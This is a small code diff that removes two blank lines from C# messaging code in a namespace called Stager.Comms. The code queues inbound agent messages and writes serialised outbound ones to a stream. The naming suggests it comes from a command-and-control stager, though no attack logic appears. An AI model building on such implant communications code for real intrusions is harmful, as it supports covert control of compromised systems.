@@ -88,7 +88,6 @@ namespace Stager.Comms
                 {
                     Inbound.Enqueue(inbound);
                 }
-
             }
 
             var outbound = new AgentMessage();
@@ -99,7 +98,6 @@ namespace Stager.Comms
             }
 
             var dataToSend = Utilities.SerialiseData(outbound);
-
             stream.BeginWrite(dataToSend, 0, dataToSend.Length, new AsyncCallback(WriteCallback), stream);
         }
 
